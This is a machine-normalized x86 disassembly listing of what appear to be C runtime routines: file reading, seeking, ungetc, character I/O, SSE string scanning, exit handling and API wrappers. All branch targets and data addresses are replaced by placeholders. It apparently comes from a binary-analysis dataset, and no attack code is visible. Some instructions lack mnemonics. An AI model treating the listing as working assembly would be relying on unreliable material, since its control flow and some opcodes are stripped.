add esp 0x10
sub ebx eax
add [ esi ] eax
jmp r-xdata
call sub_42a231
or [ esi + 0xc ] 0x10
jmp r-xdata
cmp eax 0xffffffff
je r-xdata
add [ ebp - 0x4 ] eax
sub [ ebp - 0x8 ] eax
mov ecx [ ebp - 0xc ]
jmp r-xdata
sub ebx eax
test ebx ebx
jne r-xdata
sub_422b8d
push 0xc
push r--data
call sub_429ad0
xor edi edi
mov [ ebp - 0x1c ] edi
cmp [ ebp + 0x10 ] edi
je r-xdata
xor eax eax
cmp [ ebp + 0x14 ] edi
je r-xdata
mov esi [ ebp + 0x18 ]
test esi esi
jne r-xdata
push esi
call sub_4240a8
pop ecx
mov [ ebp - 0x4 ] edi
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4229af
add esp 0x14
mov edi eax
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_422c16
mov eax edi
jmp r-xdata
cmp [ ebp + 0xc ] 0xffffffff
je r-xdata
call sub_429b15
retn
call sub_427b11
mov [ eax ] 0x16
call sub_42a231
push [ ebp + 0xc ]
push edi
push [ ebp + 0x8 ]
call sub_427900
add esp 0xc
sub_422c1e
push ebp
mov ebp esp
push ecx
push ecx
mov ecx [ ebp + 0xc ]
push ebx
push esi
push edi
test ecx ecx
je r-xdata
xor eax eax
mov ebx [ ebp + 0x10 ]
test ebx ebx
je r-xdata
mov esi [ ebp + 0x14 ]
test esi esi
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
call sub_427b11
mov [ eax ] 0x16
call sub_42a231
or eax 0xffffffff
xor edx edx
div ecx
cmp ebx eax
ja r-xdata
mov edi ecx
imul edi ebx
test [ esi + 0xc ] 0x10c
mov ebx edi
je r-xdata
mov ecx 0x1000
mov ecx [ esi + 0x18 ]
jmp r-xdata
mov eax [ ebp + 0x10 ]
jmp r-xdata
mov edx [ esi + 0xc ]
and edx 0x108
je r-xdata
mov [ ebp - 0x4 ] ecx
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp ebx ecx
jb r-xdata
mov eax [ esi + 0x4 ]
mov [ ebp - 0x8 ] eax
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
push esi
movsx eax [ eax ]
push eax
call sub_42a772
pop ecx
pop ecx
cmp eax 0xffffffff
je r-xdata
test edx edx
je r-xdata
js r-xdata
sub edi ebx
mov eax edi
xor edx edx
div [ ebp + 0xc ]
jmp r-xdata
inc [ ebp + 0x8 ]
mov ecx [ esi + 0x18 ]
dec ebx
mov [ ebp - 0x4 ] ecx
test ecx ecx
jg r-xdata
mov eax ebx
test ecx ecx
je r-xdata
push esi
call sub_42448b
pop ecx
test eax eax
jne r-xdata
or [ esi + 0xc ] 0x20
cmp ebx eax
jae r-xdata
test ebx ebx
jne r-xdata
xor ecx ecx
inc ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] ebx
xor edx edx
div ecx
mov eax ebx
sub eax edx
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
push eax
push [ ebp + 0x8 ]
push [ esi ]
call sub_424fc0
mov eax [ ebp - 0x8 ]
sub [ esi + 0x4 ] eax
add [ esi ] eax
add esp 0xc
sub ebx eax
add [ ebp + 0x8 ] eax
jmp r-xdata
mov eax ebx
mov [ ebp - 0x8 ] ebx
mov ecx [ ebp - 0x8 ]
mov edx ecx
cmp eax ecx
ja r-xdata
push eax
push [ ebp + 0x8 ]
push esi
call sub_42b76c
pop ecx
push eax
call sub_42c027
add esp 0xc
cmp eax 0xffffffff
je r-xdata
mov ecx [ ebp - 0x4 ]
jmp r-xdata
add [ ebp + 0x8 ] edx
sub ebx edx
cmp eax ecx
jb r-xdata
mov edx eax
sub_422d75
push 0xc
push r--data
call sub_429ad0
cmp [ ebp + 0xc ] 0x0
je r-xdata
xor eax eax
cmp [ ebp + 0x10 ] 0x0
je r-xdata
xor eax eax
mov esi [ ebp + 0x14 ]
test esi esi
setne al
test eax eax
jne r-xdata
push esi
call sub_4240a8
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_422c1e
add esp 0x10
mov edi eax
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_422deb
mov eax edi
jmp r-xdata
call sub_427b11
mov [ eax ] 0x16
call sub_42a231
call sub_429b15
retn
sub_422df3
push ebp
mov ebp esp
mov eax 0x1020
call sub_42cc00
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0x8 ]
mov [ ebp - 0x1020 ] ebx
test ebx ebx
jne r-xdata
push esi
push ebx
call sub_42b76c
mov esi eax
xor eax eax
pop ecx
mov [ ebp - 0x1018 ] esi
cmp [ ebx + 0x4 ] eax
jge r-xdata
call sub_427b11
mov [ eax ] 0x16
call sub_42a231
or eax 0xffffffff
jmp r-xdata
push 0x1
push eax
push esi
call sub_42c933
mov ecx eax
add esp 0xc
mov [ ebp - 0x1008 ] ecx
test ecx ecx
jns r-xdata
mov [ ebx + 0x4 ] eax
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop ebx
call sub_421ed7
leave
retn
mov edx esi
sar edx 0x5
mov [ ebp - 0x1010 ] edx
mov edx [ edx * 4 + rw-data ]
mov eax esi
and eax 0x1f
shl eax 0x6
mov [ ebp - 0x101c ] eax
mov dl [ eax + edx + 0x24 ]
add dl dl
sar dl 0x1
test [ ebx + 0xc ] 0x108
mov [ ebp - 0x1009 ] dl
jne r-xdata
or eax 0xffffffff
jmp r-xdata
mov esi [ ebx ]
push edi
mov edi esi
sub edi [ ebx + 0x8 ]
test [ ebx + 0xc ] 0x3
mov [ ebp - 0x1014 ] edi
je r-xdata
sub ecx [ ebx + 0x4 ]
mov eax ecx
jmp r-xdata
pop esi
test [ ebx + 0xc ] 0x80
jne r-xdata
cmp dl 0x1
jne r-xdata
test ecx ecx
jne r-xdata
call sub_427b11
mov [ eax ] 0x16
jmp r-xdata
mov edi [ ebp - 0x1010 ]
mov ecx [ edi * 4 + rw-data ]
mov edi [ ebp - 0x1014 ]
test [ eax + ecx + 0x4 ] 0x80
mov ecx [ ebp - 0x1008 ]
je r-xdata
mov edi [ ebp - 0x1010 ]
mov ecx [ edi * 4 + rw-data ]
mov edi [ ebp - 0x1014 ]
cmp [ eax + ecx + 0x30 ] 0x0
mov ecx [ ebp - 0x1008 ]
je r-xdata
test [ ebx + 0xc ] 0x1
je r-xdata
mov eax edi
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebx + 0x8 ]
mov [ ebp - 0x1014 ] ecx
cmp ecx esi
mov ecx [ ebp - 0x1008 ]
jae r-xdata
shr edi 0x1
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
cmp dl 0x1
jne r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
pop edi
mov eax [ ebp - 0x1014 ]
mov edx [ ebp - 0x1010 ]
mov ebx [ ebp - 0x1018 ]
mov ecx [ edx * 4 + rw-data ]
push 0x0
push [ eax + ecx + 0x2c ]
push [ eax + ecx + 0x28 ]
push ebx
call sub_42ca87
mov ecx [ ebp - 0x101c ]
mov esi eax
mov eax [ ebp - 0x1010 ]
add esp 0x10
mov eax [ eax * 4 + rw-data ]
cmp esi [ ecx + eax + 0x28 ]
jne r-xdata
mov eax ecx
jmp r-xdata
lea eax [ edi + ecx ]
shr edi 0x1
sub esi [ ebx + 0x8 ]
add esi [ ebx + 0x4 ]
mov ebx [ ebp - 0x1010 ]
mov ecx [ ebx * 4 + rw-data ]
mov ebx [ ebp - 0x1020 ]
test [ eax + ecx + 0x4 ] 0x80
mov ecx [ ebp - 0x1008 ]
je r-xdata
xor edi edi
jmp r-xdata
inc eax
cmp eax esi
jb r-xdata
inc edi
cmp edx [ ecx + eax + 0x2c ]
jne r-xdata
sub ecx esi
push 0x2
push 0x0
push [ ebp - 0x1018 ]
call sub_42c933
mov ecx [ ebp - 0x1008 ]
add esp 0xc
cmp eax ecx
jne r-xdata
cmp [ eax ] 0xa
jne r-xdata
mov eax [ ebp - 0x101c ]
push 0x0
lea edx [ ebp - 0x1014 ]
push edx
push 0x1000
lea edx [ ebp - 0x1004 ]
push edx
push [ ecx + eax ]
call [ ReadFile@IAT ]
test eax eax
je r-xdata
push 0x0
push ecx
push [ ebp - 0x1018 ]
call sub_42c933
add esp 0xc
test eax eax
jns r-xdata
mov eax [ ebx + 0x8 ]
lea edx [ eax + esi ]
jmp r-xdata
push 0x0
push [ ebp - 0x1008 ]
push ebx
call sub_42c933
add esp 0xc
test eax eax
js r-xdata
mov eax 0x200
cmp esi eax
ja r-xdata
cmp eax edx
jb r-xdata
mov eax [ ebp - 0x1014 ]
cmp edi eax
ja r-xdata
mov esi [ ebx + 0x18 ]
test [ ebx + 0xc ] 0x8
je r-xdata
cmp [ eax ] 0xa
jne r-xdata
test [ ebx + 0xc ] 0x2000
jmp r-xdata
lea ecx [ ebp - 0x1004 ]
test edi edi
je r-xdata
mov dl [ ebp - 0x1009 ]
cmp dl 0x1
jne r-xdata
inc esi
test [ ebx + 0xc ] 0x400
mov esi eax
je r-xdata
inc eax
inc esi
je r-xdata
lea eax [ ebp - 0x1004 ]
sub esi eax
lea eax [ ecx + esi ]
jmp r-xdata
mov edx ecx
add edx eax
shr esi 0x1
mov eax [ ebp - 0x1010 ]
mov ecx [ ebp - 0x101c ]
mov eax [ eax * 4 + rw-data ]
test [ ecx + eax + 0x4 ] 0x4
mov ecx [ ebp - 0x1008 ]
mov al [ ecx ]
cmp al 0xd
jne r-xdata
movzx eax al
movsx eax [ eax + rw-data ]
add ecx eax
lea eax [ edx - 0x1 ]
cmp ecx eax
jae r-xdata
dec edi
cmp ecx edx
jae r-xdata
inc ecx
test edi edi
jne r-xdata
lea eax [ ecx + 0x1 ]
cmp [ eax ] 0xa
jne r-xdata
mov ecx eax
jmp r-xdata
sub_423160
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xc ]
test al 0x83
jne r-xdata
push ebx
mov ebx [ ebp + 0x10 ]
and eax 0xffffffef
push edi
mov [ esi + 0xc ] eax
cmp ebx 0x1
jne r-xdata
call sub_427b11
mov [ eax ] 0x16
or eax 0xffffffff
jmp r-xdata
mov edi [ ebp + 0xc ]
push esi
call sub_422df3
mov edi [ ebp + 0xc ]
add edi eax
pop ecx
xor ebx ebx
jmp r-xdata
pop esi
pop ebp
retn
test al 0x1
je r-xdata
and eax 0xfffffffc
mov [ esi + 0xc ] eax
jmp r-xdata
push esi
call sub_42448b
mov eax [ esi + 0xc ]
pop ecx
test al al
jns r-xdata
push ebx
push edi
push esi
call sub_42b76c
pop ecx
push eax
call sub_42c933
add esp 0xc
xor ecx ecx
cmp eax 0xffffffff
setne cl
pop edi
pop ebx
lea eax [ ecx - 0x1 ]
test al 0x8
je r-xdata
test eax 0x400
jne r-xdata
mov [ esi + 0x18 ] 0x200
sub_4231ef
push 0xc
push r--data
call sub_429ad0
xor eax eax
mov esi [ ebp + 0x8 ]
test esi esi
setne al
test eax eax
jne r-xdata
mov edi [ ebp + 0x10 ]
test edi edi
je r-xdata
call sub_427b11
mov [ eax ] 0x16
call sub_42a231
or eax 0xffffffff
jmp r-xdata
push esi
call sub_4240a8
pop ecx
and [ ebp - 0x4 ] 0x0
push edi
push [ ebp + 0xc ]
push esi
call sub_423160
add esp 0xc
mov edi eax
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_423266
mov eax edi
cmp edi 0x1
je r-xdata
call sub_429b15
retn
cmp edi 0x2
jne r-xdata
sub_42326e
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
or edi 0xffffffff
test esi esi
jne r-xdata
test [ esi + 0xc ] 0x83
je r-xdata
call sub_427b11
mov [ eax ] 0x16
call sub_42a231
or eax edi
jmp r-xdata
and [ esi + 0xc ] 0x0
mov eax edi
push esi
call sub_42448b
push esi
mov edi eax
call sub_42d231
push esi
call sub_42b76c
push eax
call sub_42d0cd
add esp 0x10
test eax eax
jns r-xdata
pop edi
pop esi
pop ebp
retn
cmp [ esi + 0x1c ] 0x0
je r-xdata
or edi 0xffffffff
jmp r-xdata
push [ esi + 0x1c ]
call sub_422732
and [ esi + 0x1c ] 0x0
pop ecx
sub_4232da
push 0xc
push r--data
call sub_429ad0
or edi 0xffffffff
mov [ ebp - 0x1c ] edi
xor eax eax
mov esi [ ebp + 0x8 ]
test esi esi
setne al
test eax eax
jne r-xdata
test [ esi + 0xc ] 0x40
je r-xdata
call sub_427b11
mov [ eax ] 0x16
call sub_42a231
push esi
call sub_4240a8
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
call sub_42326e
pop ecx
mov edi eax
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_423349
jmp r-xdata
and [ esi + 0xc ] 0x0
jmp r-xdata
mov eax edi
call sub_429b15
retn
sub_423366
push 0xc
push r--data
call sub_429ad0
xor eax eax
cmp [ ebp + 0x8 ] eax
setne al
test eax eax
jne r-xdata
call sub_4240a2
add eax 0x20
push eax
push 0x1
call sub_4240e7
pop ecx
pop ecx
and [ ebp - 0x4 ] 0x0
call sub_4240a2
add eax 0x20
push eax
call sub_42d292
pop ecx
mov esi eax
lea eax [ ebp + 0xc ]
push eax
push 0x0
push [ ebp + 0x8 ]
call sub_4240a2
add eax 0x20
push eax
call sub_42d338
mov edi eax
mov [ ebp - 0x1c ] edi
call sub_4240a2
add eax 0x20
push eax
push esi
call sub_42d261
add esp 0x18
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4233ff
mov eax edi
call sub_427b11
mov [ eax ] 0x16
call sub_42a231
or eax 0xffffffff
jmp r-xdata
call sub_429b15
retn
sub_423412
push ebp
mov ebp esp
push ecx
push ebx
xor ebx ebx
push esi
cmp [ ebp + 0x8 ] ebx
jne r-xdata
mov esi [ ebp + 0xc ]
test esi esi
je r-xdata
call sub_427b11
push 0x16
pop esi
mov [ eax ] esi
call sub_42a231
mov eax esi
jmp r-xdata
call sub_4275e6
test eax eax
jne r-xdata
pop esi
pop ebx
leave
retn
xor eax eax
push eax
push eax
push 0xffffffff
push [ ebp + 0x8 ]
mov [ esi ] eax
push eax
push ebx
call [ MultiByteToWideChar@IAT ]
mov [ ebp - 0x4 ] eax
test eax eax
jne r-xdata
call [ AreFileApisANSI@IAT ]
test eax eax
jne r-xdata
add eax eax
push eax
call sub_4266f1
pop ecx
mov [ esi ] eax
test eax eax
je r-xdata
call [ GetLastError@IAT ]
push eax
call sub_427af0
xor ebx ebx
inc ebx
xor eax eax
jmp r-xdata
push [ ebp - 0x4 ]
push eax
push 0xffffffff
push [ ebp + 0x8 ]
push 0x0
push ebx
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
xor eax eax
inc eax
call [ GetLastError@IAT ]
push eax
call sub_427af0
push [ esi ]
call sub_422732
and [ esi ] 0x0
pop ecx
jmp r-xdata
pop ecx
sub_4234c2
push ebp
mov ebp esp
push ecx
lea eax [ ebp - 0x4 ]
push eax
push r--data
push 0x0
call [ GetModuleHandleExW@IAT ]
test eax eax
je r-xdata
leave
retn
push r--data
push [ ebp - 0x4 ]
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call eax
sub_423544
push ebp
mov ebp esp
cmp [ r--data ] 0x0
je r-xdata
call sub_42e131
push r--data
push r--data
call sub_42363d
pop ecx
pop ecx
test eax eax
jne r-xdata
push r--data
call sub_42e040
pop ecx
test eax eax
je r-xdata
pop ebp
retn
push esi
push edi
push sub_42dfca
call sub_4226f3
pop ecx
mov esi r--data
mov edi r--data
jmp r-xdata
push [ ebp + 0x8 ]
call [ r--data ]
pop ecx
cmp esi edi
jb r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
cmp [ rw-data ] 0x0
pop edi
pop esi
je r-xdata
add esi 0x4
call eax
xor eax eax
push rw-data
call sub_42e040
pop ecx
test eax eax
je r-xdata
push 0x0
push 0x2
push 0x0
call [ rw-data ]
sub_4235e9
push esi
push 0x0
call [ EncodePointer@IAT ]
mov esi eax
push esi
call sub_429a8a
push esi
call sub_42a1f9
push esi
call sub_42a0b4
push esi
call sub_42e1e0
push esi
call sub_42e1fa
push esi
call sub_42e1cf
add esp 0x18
pop esi
jmp sub_427624
sub_423621
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
jmp r-xdata
cmp esi [ ebp + 0xc ]
jb r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop esi
pop ebp
retn
add esi 0x4
call eax
sub_42363d
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
jmp r-xdata
cmp esi [ ebp + 0xc ]
jb r-xdata
test eax eax
jne r-xdata
pop esi
pop ebp
retn
mov ecx [ esi ]
test ecx ecx
je r-xdata
add esi 0x4
call ecx
sub_423671
push 0x1c
push r--data
call sub_429ad0
push 0x8
call sub_425b56
pop ecx
and [ ebp - 0x4 ] 0x0
cmp [ rw-data ] 0x1
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_42378b
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov [ rw-data ] 0x1
mov al [ ebp + 0x10 ]
mov [ rw-data ] al
cmp [ ebp + 0xc ] 0x0
jne r-xdata
call sub_429b15
retn
mov [ rw-data ] 0x1
push 0x8
call sub_425cba
pop ecx
push [ ebp + 0x8 ]
call sub_4234f4
push r--data
push r--data
call sub_423621
pop ecx
pop ecx
push [ rw-data ]
mov esi [ DecodePointer@IAT ]
call esi
mov ebx eax
mov [ ebp - 0x2c ] ebx
test ebx ebx
je r-xdata
push r--data
push r--data
call sub_423621
pop ecx
pop ecx
push [ rw-data ]
call esi
mov edi eax
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x20 ] edi
push 0x0
call [ EncodePointer@IAT ]
cmp [ edi ] eax
je r-xdata
sub edi 0x4
mov [ ebp - 0x24 ] edi
cmp edi ebx
jb r-xdata
cmp edi ebx
jb r-xdata
push [ edi ]
call esi
mov esi eax
push 0x0
call [ EncodePointer@IAT ]
mov [ edi ] eax
call esi
push [ rw-data ]
mov esi [ DecodePointer@IAT ]
call esi
mov [ ebp - 0x28 ] eax
push [ rw-data ]
call esi
mov ecx [ ebp - 0x28 ]
cmp [ ebp - 0x1c ] ecx
jne r-xdata
mov [ ebp - 0x1c ] ecx
mov ebx ecx
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x20 ] eax
mov edi eax
jmp r-xdata
cmp [ ebp - 0x20 ] eax
je r-xdata
mov [ ebp - 0x24 ] edi
sub_4237c0
push ebp
mov ebp esp
push edi
cmp [ rw-data ] 0x1
jb r-xdata
mov edi [ ebp + 0x8 ]
xor eax eax
or ecx 0xffffffff
[ edi ]
add ecx 0x1
neg ecx
sub edi 0x1
mov al [ ebp + 0xc ]
std
[ edi ]
add edi 0x1
cmp [ edi ] al
je r-xdata
mov edi [ ebp + 0x8 ]
ja r-xdata
mov eax edi
xor eax eax
jmp r-xdata
movzx edx [ ebp + 0xc ]
test edx edx
je r-xdata
movzx edx [ ebp + 0xc ]
mov eax edx
shl edx 0x8
or edx eax
movd xmm3 edx
pshuflw xmm3 xmm3 0x0
movlhps xmm3 xmm3
mov ecx 0xf
and ecx edi
or eax 0xffffffff
shl eax cl
sub edi ecx
xor edx edx
cld
pop edi
leave
retn
mov eax 0xfffffff0
and eax edi
pxor xmm0 xmm0
pcmpeqb xmm0 [ eax ]
mov ecx 0xf
and ecx edi
mov edx 0xffffffff
shl edx cl
pmovmskb edi xmm0
and edi edx
jne r-xdata
xor eax eax
test edi 0xf
je r-xdata
push ebx
pmovmskb ebx xmm1
and ebx eax
shl ecx 0x1
xor eax eax
sub eax ecx
and ecx eax
dec ecx
and ecx ebx
pop ebx
bsr eax ecx
add eax edi
test ecx ecx
cmove eax edx
pop edi
leave
retn
pmovmskb ecx xmm1
and ecx eax
bsr eax ecx
add eax edi
test ecx ecx
cmovne edx eax
or eax 0xffffffff
add edi 0x10
jmp r-xdata
bsf edx edi
add eax edx
jmp r-xdata
pxor xmm0 xmm0
pcmpeqb xmm0 [ eax + 0x10 ]
add eax 0x10
pmovmskb edi xmm0
test edi edi
je r-xdata
movd xmm0 edx
movzx ecx [ edi ]
cmp ecx edx
cmove eax edi
test ecx ecx
je r-xdata
movdqu xmm1 [ edi ]
pxor xmm2 xmm2
pcmpeqb xmm2 xmm1
pcmpeqb xmm1 xmm3
pmovmskb ecx xmm2
and ecx eax
jne r-xdata
pop edi
leave
retn
add edi 0x10
pcmpistri xmm0 [ edi - 0x10 ] 0x40
lea ecx [ edi + ecx - 0x10 ]
cmovb eax ecx
jne r-xdata
inc edi
test edi 0xf
jne r-xdata
sub_42392e
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
and [ esi + 0x4 ] 0x0
mov [ esi ] r--data
mov [ esi + 0x8 ] 0x0
push [ eax ]
call sub_4239f4
mov eax esi
pop esi
pop ebp
retn 0x4
sub_42396e
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
and [ esi + 0x4 ] 0x0
mov [ esi ] r--data
mov [ esi + 0x8 ] 0x0
call sub_42399c
mov eax esi
pop esi
pop ebp
retn 0x4
sub_42399c
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
cmp esi edi
je r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn 0x4
call sub_423a32
cmp [ edi + 0x8 ] 0x0
je r-xdata
mov eax [ edi + 0x4 ]
mov [ esi + 0x4 ] eax
push [ edi + 0x4 ]
mov ecx esi
call sub_4239f4
jmp r-xdata
sub_4239cf
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_423a32
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call j_sub_422732#2
pop ecx
sub_4239f4
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
push ebx
mov ebx ecx
je r-xdata
pop ebx
pop ebp
retn 0x4
push edi
push [ ebp + 0x8 ]
call sub_425610
lea edi [ eax + 0x1 ]
push edi
call sub_42276a
pop ecx
pop ecx
mov [ ebx + 0x4 ] eax
test eax eax
je r-xdata
pop edi
push [ ebp + 0x8 ]
push edi
push eax
call sub_42eb0a
add esp 0xc
mov [ ebx + 0x8 ] 0x1
sub_423a5b
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x14 ]
test esi esi
jne r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
push edi
mov edi [ ebp + 0x10 ]
test edi edi
je r-xdata
call sub_427b11
push 0x16
pop esi
mov [ eax ] esi
call sub_42a231
mov eax esi
jmp r-xdata
pop esi
pop ebp
retn
push [ ebp + 0xc ]
push 0x0
push eax
call sub_427900
add esp 0xc
test edi edi
jne r-xdata
cmp [ ebp + 0xc ] esi
jb r-xdata
cmp [ ebp + 0xc ] esi
jae r-xdata
call sub_427b11
push 0x16
jmp r-xdata
push esi
push edi
push eax
call sub_424fc0
add esp 0xc
xor eax eax
jmp r-xdata
push 0x16
pop eax
call sub_427b11
push 0x22
pop esi
mov [ eax ] esi
call sub_42a231
mov eax esi
jmp r-xdata
pop edi
sub_423ae0
mov eax [ esp + 0xc ]
push ebx
test eax eax
je r-xdata
pop ebx
retn
mov edx [ esp + 0x8 ]
xor ebx ebx
mov bl [ esp + 0xc ]
test edx 0x3
je r-xdata
sub eax 0x4
jb r-xdata
mov cl [ edx ]
add edx 0x1
xor cl bl
je r-xdata
add eax 0x4
je r-xdata
push edi
mov edi ebx
shl ebx 0x8
add ebx edi
mov edi ebx
shl ebx 0x10
add ebx edi
jmp r-xdata
lea eax [ edx - 0x1 ]
pop ebx
retn
sub eax 0x1
je r-xdata
mov cl [ edx ]
add edx 0x1
xor cl bl
je r-xdata
mov ecx [ edx ]
xor ecx ebx
mov edi 0x7efefeff
add edi ecx
xor ecx 0xffffffff
xor ecx edi
add edx 0x4
and ecx 0x81010100
je r-xdata
test edx 0x3
jne r-xdata
sub eax 0x1
jne r-xdata
sub eax 0x4
jb r-xdata
mov ecx [ edx - 0x4 ]
xor cl bl
je r-xdata
pop edi
lea eax [ edx - 0x4 ]
pop edi
pop ebx
retn
xor ch bl
je r-xdata
lea eax [ edx - 0x3 ]
pop edi
pop ebx
retn
shr ecx 0x10
xor cl bl
je r-xdata
lea eax [ edx - 0x2 ]
pop edi
pop ebx
retn
xor ch bl
je r-xdata
pop edi
jmp r-xdata
sub_423b8d
push 0xc
push r--data
call sub_429ad0
xor edi edi
mov [ ebp - 0x1c ] edi
xor eax eax
mov esi [ ebp + 0x8 ]
test esi esi
setne al
test eax eax
jne r-xdata
push esi
call sub_4240a8
pop ecx
mov [ ebp - 0x4 ] edi
test [ esi + 0xc ] 0x40
jne r-xdata
call sub_427b11
mov [ eax ] 0x16
call sub_42a231
or eax 0xffffffff
jmp r-xdata
test edi edi
jne r-xdata
push esi
call sub_42b76c
pop ecx
mov edx eax
cmp edx 0xffffffff
je r-xdata
call sub_429b15
retn
mov [ ebp - 0x4 ] 0xfffffffe
call sub_423c7e
mov eax edi
dec [ esi + 0x4 ]
js r-xdata
mov eax rw-data
cmp edx 0xfffffffe
je r-xdata
push esi
call sub_42b64b
pop ecx
mov edi eax
mov eax [ esi ]
movzx edi [ eax ]
inc eax
mov [ esi ] eax
jmp r-xdata
call sub_427b11
mov [ eax ] 0x16
call sub_42a231
or edi 0xffffffff
mov [ ebp - 0x1c ] edi
cmp edx 0xffffffff
je r-xdata
mov ecx edx
sar ecx 0x5
and eax 0x1f
shl eax 0x6
add eax [ ecx * 4 + rw-data ]
jmp r-xdata
mov [ ebp - 0x1c ] edi
mov edx rw-data
cmp edx 0xfffffffe
je r-xdata
test [ eax + 0x24 ] 0x7f
jne r-xdata
mov eax edx
sar eax 0x5
and edx 0x1f
shl edx 0x6
add edx [ eax * 4 + rw-data ]
jmp r-xdata
test [ edx + 0x24 ] 0x80
je r-xdata
sub_423c86
push 0xc
push r--data
call sub_429ad0
xor edi edi
mov [ ebp - 0x1c ] edi
xor eax eax
mov esi [ ebp + 0xc ]
test esi esi
setne al
test eax eax
jne r-xdata
push esi
call sub_4240a8
pop ecx
mov [ ebp - 0x4 ] edi
test [ esi + 0xc ] 0x40
jne r-xdata
call sub_427b11
mov [ eax ] 0x16
call sub_42a231
or eax 0xffffffff
jmp r-xdata
test edi edi
jne r-xdata
push esi
call sub_42b76c
pop ecx
mov edx eax
cmp edx 0xffffffff
je r-xdata
call sub_429b15
retn
mov [ ebp - 0x4 ] 0xfffffffe
call sub_423d7f
mov eax edi
dec [ esi + 0x4 ]
js r-xdata
mov eax rw-data
cmp edx 0xfffffffe
je r-xdata
push esi
push [ ebp + 0x8 ]
call sub_42a772
pop ecx
pop ecx
mov edi eax
mov eax [ esi ]
mov ecx [ ebp + 0x8 ]
mov [ eax ] cl
movzx edi cl
inc [ esi ]
jmp r-xdata
call sub_427b11
mov [ eax ] 0x16
call sub_42a231
or edi 0xffffffff
mov [ ebp - 0x1c ] edi
cmp edx 0xffffffff
je r-xdata
mov ecx edx
sar ecx 0x5
and eax 0x1f
shl eax 0x6
add eax [ ecx * 4 + rw-data ]
jmp r-xdata
mov [ ebp - 0x1c ] edi
mov edx rw-data
cmp edx 0xfffffffe
je r-xdata
test [ eax + 0x24 ] 0x7f
jne r-xdata
mov eax edx
sar eax 0x5
and edx 0x1f
shl edx 0x6
add edx [ eax * 4 + rw-data ]
jmp r-xdata
test [ edx + 0x24 ] 0x80
je r-xdata
sub_423d87
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
or edi 0xffffffff
test [ esi + 0xc ] 0x40
jne r-xdata
mov ebx [ ebp + 0x8 ]
cmp ebx edi
je r-xdata
push esi
call sub_42b76c
pop ecx
mov ecx eax
mov ebx rw-data
cmp ecx edi
je r-xdata
mov eax edi
test [ esi + 0xc ] 0x1
jne r-xdata
mov edx ebx
cmp ecx 0xfffffffe
je r-xdata
cmp [ esi + 0x8 ] 0x0
jne r-xdata
test [ esi + 0xc ] 0x80
je r-xdata
call sub_427b11
mov [ eax ] 0x16
call sub_42a231
cmp ecx edi
je r-xdata
mov edx ecx
and edx 0x1f
sar eax 0x5
shl edx 0x6
add edx [ eax * 4 + rw-data ]
jmp r-xdata
mov eax [ esi ]
cmp eax [ esi + 0x8 ]
jne r-xdata
push esi
call sub_42eb5f
pop ecx
test [ esi + 0xc ] 0x2
jne r-xdata
mov ecx ebx
cmp ecx 0xfffffffe
je r-xdata
test [ edx + 0x24 ] 0x7f
jne r-xdata
dec [ esi ]
test [ esi + 0xc ] 0x40
mov eax [ esi ]
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov eax ecx
and ecx 0x1f
sar eax 0x5
shl ecx 0x6
add ecx [ eax * 4 + rw-data ]
jmp r-xdata
mov [ eax ] bl
cmp [ eax ] bl
je r-xdata
inc eax
mov [ esi ] eax
test [ ecx + 0x24 ] 0x80
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ esi + 0xc ]
inc [ esi + 0x4 ]
and eax 0xffffffef
or eax 0x1
mov [ esi + 0xc ] eax
movzx eax bl
jmp r-xdata
inc eax
mov [ esi ] eax
jmp r-xdata
sub_423e67
push 0xc
push r--data
